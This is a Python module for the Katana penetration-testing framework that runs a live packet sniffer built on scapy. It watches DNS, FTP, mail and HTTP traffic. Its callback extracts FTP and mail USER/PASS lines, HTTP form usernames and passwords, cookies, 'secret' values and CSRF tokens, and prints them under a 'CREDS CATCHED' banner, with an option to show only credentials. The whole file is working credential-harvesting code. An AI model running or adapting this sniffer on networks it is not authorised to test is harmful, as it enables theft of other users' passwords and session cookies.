# This module requires katana framework
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import		      #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from scapy.all import *
import sys, re, time
# END LIBRARIES

# VARIABLES
gcookie = "" 	# Global for not printing the same cookie multiple times
gsecret = ""    # Same for secret
# END VARIABLES

# INFORMATION MODULE
def init():
	init.Author			="Thomas TJ 2016 (TTJ) - Collaborator(RedToor)"
	init.Version			="2.0"
	init.Description		="HTTP sniffer"
	init.CodeName			="net/work.sniff"
	init.DateCreation		="09/11/2016"
	init.LastModification	        ="24/12/2016"
	init.Collaborators              =None
	init.References		 	=None
	init.License			=KTF_LINCENSE
	init.var			={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME		VALUE		 RQ	   DESCRIPTION
		'interface' :[INTERFACE_ETHERNET,True ,'Monitor Interface'],
		'filter'    :["ALL"	        ,False,'Filter sniff'],
		'onlycreds' :["false"	        ,False,'Only show creds'],
		'hideempty' :["true"	        ,False,'Hide empty pkts'],
		'ignore'    :["false"	        ,False,'Ignore js etc']

	}

	init.aux =  "\n  {PARAMETER}  {DESCRIPTION} -> [filter]"
	init.aux += "\n  [ALL]        Whatever"
	init.aux += "\n  [DNS]        Domains Name Service"
	init.aux += "\n  [FTP]        File Transfer Protocol"
	init.aux += "\n  [POP]        Post Office Protocol"
	init.aux += "\n  [HTTP]       HTTP"
	init.aux += "\n  [MAIL]       Mail (25, 110, 143)\n"
	init.aux += "\n  Devices Founds: "+str(NET.GetInterfacesOnSystem())
	init.aux += "\n  Monitors mode : "+str(NET.GetMonitorInterfaces())
	init.aux += "\n  Functions     : For Start Monitor Mode, type 'f::start_monitor(Interface)\n"
	return init
# END INFORMATION MODULE

# CODE MODULE	############################################################################################
def main(run):

	try:
		if  init.var['filter'] == "DNS" : FILTER = "udp or port 53"
		elif init.var['filter']  == "FTP" : FILTER = "port 21"
		elif init.var['filter']  == "ALL" : FILTER = "udp or tcp"
		elif init.var['filter']  == "POP" : FILTER = "port 110"
		elif init.var['filter']  == "HTTP" : FILTER = "port 80 or 8080"
		elif init.var['filter']  == "MAIL" : FILTER = "port 25 or 110 or 143"
		else:
			printk.err("Type not allow, use show options or sop and see Auxiliar help.")
			FILTER = "udp or tcp"
			return

		if  NET.CheckIfExistInterface(init.var['interface']):
			printk.inf("Sniffing HTTP protocol.")
			while True:sniff(filter=FILTER, prn=callback, store=0, iface=str(init.var['interface']))
	except KeyboardInterrupt:
		sys.exit()


# END CODE MODULE ############################################################################################



def callback(pkt):

	#try:
	if pkt.dport == 53 and pkt[DNS].opcode == 0L and pkt[IP].proto == 17:
		printable = (
			' '+'['+ time.strftime("%H:%M:%S")+'] '
			+ ("%-*s" % (6, str(pkt[IP].id)))+colors[13]+"  DNS   "+colors[0]+(" SRC: %-*s DST: %s" % (16, str(pkt[IP].src), pkt[DNS].qd.qname))+colors[0]
			)
		return printable


	# MAIL
	mailuserpass = ""
	if pkt.dport == 25 or pkt.dport == 110 or pkt.dport == 143:
		if pkt[TCP].payload:
			ftp_packet = str(pkt[TCP].payload)
			# Only interested in USER and PWD
			if init.var['onlycreds'] == "true":
				if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
					printable = " ["+ time.strftime("%H:%M:%S")+"] "+("%-*s" % (6, str(pkt[IP].id)))+colors[11]+"  POP  "+colors[0]+" "+("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))+" "+"DATA:  "+colors[2]+str(pkt[TCP].payload).replace("\n", ".")+colors[0]
					return printable

			if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
				mailuserpass = ("DATA:  " + colors[2] + str(pkt[TCP].payload).replace("\n", " "))
			elif ftp_packet:
				mailuserpass = ("DATA:  " + str(pkt[TCP].payload).replace("\n", " "))
			else:
				try:
					mailuserpass = ("DATA:  " + str(pkt[Raw].load).replace("\n", " "))
				except:
					mailuserpass = ""

			printable = " ["+ time.strftime("%H:%M:%S")+"] "+("%-*s" % (6, str(pkt[IP].id)))+colors[11]+"  POP  "+colors[0]+" "+("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))+" "+mailuserpass+colors[0]
			return printable

	# FTP
	userpass = ""
	if pkt.dport == 21:
		if pkt[TCP].payload:
			ftp_packet = str(pkt[TCP].payload)
			# Only interested in USER and PWD
			if init.var['onlycreds'] == "true":
				if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
					printable = " ["+ time.strftime("%H:%M:%S")+"] "+("%-*s" % (6, str(pkt[IP].id)))+colors[12]+"  FTP   "+colors[0]+" "+("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))+" "+"DATA:  "+colors[2]+str(pkt[TCP].payload).replace("\n", ".")+colors[0]
					return printable
			# Want it all
			else:
				if 'user' in ftp_packet.lower() or 'pass' in ftp_packet.lower():
					userpass = ("DATA: " + colors[2] + str(pkt[TCP].payload).replace("\n", " "))
				elif ftp_packet:
					userpass = ("DATA: " + str(pkt[TCP].payload).replace("\n", " "))
				else:
					try:
						userpass = ("DATA: " + str(pkt[Raw].load).replace("\n", " "))
					except:
						userpass = ""

				printable = " ["+ time.strftime("%H:%M:%S")+"] "+("%-*s" % (6, str(pkt[IP].id)))+colors[12]+"  FTP   "+colors[0]+" "+("SRC: %-*s DST: %-*s" % (16, str(pkt[IP].src), 16, str(pkt[IP].dst)))+" "+userpass+colors[0]
				return printable

	# HTTP
	host2 = "" #test
	payload = ""
	host = ""
	username = ""
	password = ""
	cookie = ""
	path = ""
	post = ""
	secret = ""
	csrf = ""
	raw_dport = ""
	global gcookie
	global gsecret
	if True:
	#if pkt.dport == 80 or pkt.dport == 8080:
		try:
			#payload = str(pkt[TCP].payload)
			raw_dport = str(pkt[TCP].dport)
		except:
			#payload = ""
			raw_dport = ""
		try:
			raw = str(pkt[Raw].show)
			raw_dport = str(pkt[TCP].dport)
		except:
			raw = ""

		if raw == "":
			return None

		# Get username
		username = ""
		if 'user' in raw or 'username':
			mu = re.search('user[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
			if mu:
				username = str(mu.group(1))
		# Get password
		if 'pass' in raw or 'pwd' in raw:
			mp = re.search('pass[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
			if mp:
				password = str(mp.group(1))
			else:
				mp = re.search('pwd[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
				if mp:
					password = str(mp.group(1))
			if password.isspace():
				password = ""

		# Get path
		if raw:
			mpath = re.search('\\\\r\\\\n\\\\r\\\\n([A-Za-z0-9%\.=&_-]+)', raw) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
			if mpath:
				path = "  PATH: " + str(mpath.group(1))

		# Get cookie
		if raw:
			mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+)\\\\r\\\\n', raw) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
			if mcookie:
				cookie = "  COOKIE: " + str(mcookie.group(1))
				if cookie == gcookie:
					cookie = ""
				else:
					gcookie = cookie
			else:
				mcookie = re.search('Cookie:\s([A-Za-z0-9%=&_-]+);', raw) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
				if mcookie:
					cookie = "  COOKIE: " + str(mcookie.group(1))
					if cookie == gcookie:
						cookie = ""
					else:
						gcookie = cookie
			# Do a check for stupid cookies and ignore them
			#if 'Gdyn' or 'gscroll' in cookie:
			#	cookie = ""

		# Get host
		if raw:
			mhost = re.search('Host:\s([A-Za-z0-9%\.=&_-]+)\\\\r\\\\n', raw) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
			if mhost:
				host = "      |-> Head Capture -> HOST: " + str(mhost.group(1))

		# Get POST
		if raw:
			mpost = re.search('(POST.*[A-Za-z0-9%_-]+).HTTP', raw) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
			if mpost:
				post = "\n      |-> Url: " + str(mpost.group(1))
			else:
				mpost = re.search('(GET.*[A-Za-z0-9%_-]+).HTTP', raw)
				if mpost:
					post = "\n      |-> Url: " + str(mpost.group(1))

		# Get secret
		if raw:
			msecret = re.search('([A-Za-z0-9%=&_-]+secret[A-Za-z0-9%=&_-]+)', raw, re.IGNORECASE) #b(.+[A-Za-z0-9%_-])\\\\r\\\\nHost:
			if msecret:
				secret = "  SECRET: " + str(msecret.group(1))
				if secret == gsecret:
					secret = ""
				else:
					gsecret = secret

		# Get CSRF
		if raw:
			mcsrf = re.search('csrf[A-Za-z0-9%_-]*=([A-Za-z0-9%_-]+)', raw, re.IGNORECASE)
			if mcsrf:
				csrf = "      |-> CSRF: " + str(mcsrf.group(1))


		if password:
			if init.var['onlycreds'] != "true":
				printablecon = (
					 ' ' + colors[3] + '['+ time.strftime("%H:%M:%S")+']' + colors[0] + ' ' + colors[2] + 'CREDS CATCHED:' + colors[0]
					+ '\n' + " ["+ time.strftime("%H:%M:%S")+"] " + str(pkt[IP].id)
					+ '\n      |'
					+ '\n      |-> ORIGIN:   ' + str(pkt[IP].src)
					+ '\n      |-> SERVER:   ' + str(pkt[IP].dst)
					+ '\n      |-> PORT:     ' + raw_dport
					+ '\n      |----------->  USERNAME: ' + username + colors[0]
					+ '\n      |----------->  PASSWORD: ' + password + colors[0]
					+ '\n      |-> POST:     ' + post.replace("  TYPE: ", "")
					+ '\n      |-> PATH:     ' + path.replace("  PATH: ", "")
					+ '\n      |-> CSRF:     ' + csrf.replace("  CSRF: ", "")
					+ '\n      |-> HOST:     ' + host.replace("      |-> Head Capture -> HOST: ", "")
					+ '\n      |-> COOKIE:   ' + cookie.replace("  COOKIE: ", "")
					+ '\n      |-> SECRET:   ' + secret.replace("  SECRET: ", "")
					+ '\n      |'
					)

			# Only CREDS
			if init.var['onlycreds'] == "true":
				printablecon = (
					'\n'
					+ ' ' + colors[3] + '['+ time.strftime("%H:%M:%S")+']' + colors[0] + ' ' + colors[2] + "CREDS CATCHED:" + colors[0]
					+ '\n ' + " ["+ time.strftime("%H:%M:%S")+"] " + str(pkt[IP].id)
					+ '\n'
					+  colors[2] + '\n\t\t  ORIGIN  : ' + str(pkt[IP].src) + colors[0]
					+  colors[2] + '\n\t\t  USERNAME: ' + username + colors[0]
					+  colors[2] + '\n\t\t  PASSWORD: ' + password + colors[0]
					+ '\n\t\t  Path:	 ' + path
					+ '\n'
					)

			return printablecon

		elif init.var['onlycreds'] == "true":
			return None

		elif cookie or secret or csrf:
			return ' '+colors[3]+'['+ time.strftime("%H:%M:%S")+']'+colors[0]+" "+("\n      |-> ID: %-*s  type : Other\n      |-> Source: %-*s Destination: %-*s Port: %-*s\n" % (6, str(pkt[IP].id),16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))+host+post+path+colors[2]+cookie+secret+csrf+colors[0]

		elif 'login' in post.lower():
			return ' '+colors[3]+'['+ time.strftime("%H:%M:%S")+']'+colors[0]+" "+("\n      |-> ID: %-*s  type : Other\n      |-> Source: %-*s Destination: %-*s Port: %-*s\n" % (6, str(pkt[IP].id),16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))+host+colors[2]+post+path+colors[0]

		else:
			if init.var['ignore'] == "true":
				# Create for loop checking each user input ignore files instead of static
				#if re.search('(\.jpg)', post, re.IGNORECASE) is not None or re.search('(\.js)', post, re.IGNORECASE) is not None or re.search('(\.css)', post, re.IGNORECASE) is not None:
				if re.search('(\.jpg|\.js|\.css|\.jpeg|\.svg|\.png)', post, re.IGNORECASE) is not None:
					return None

			if init.var['hideempty'] == "true":
				#if raw != "" or payload != "":
				if post != "":
					return colors[9]+" ["+ time.strftime("%H:%M:%S")+"] "+("\n      |-> ID: %-*s  type : Other\n      |-> Source: %-*s Destination: %-*s Port: %-*s\n" % (6, str(pkt[IP].id),16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))+host+post+path
				else:
					return None
			else:
				return colors[9]+" ["+ time.strftime("%H:%M:%S")+"] "+("\n      |-> ID: %-*s  type : Other\n      |-> Source: %-*s Destination: %-*s Port: %-*s\n" % (6, str(pkt[IP].id), 16, str(pkt[IP].src), 16, str(pkt[IP].dst), 5, raw_dport))+host+post+path
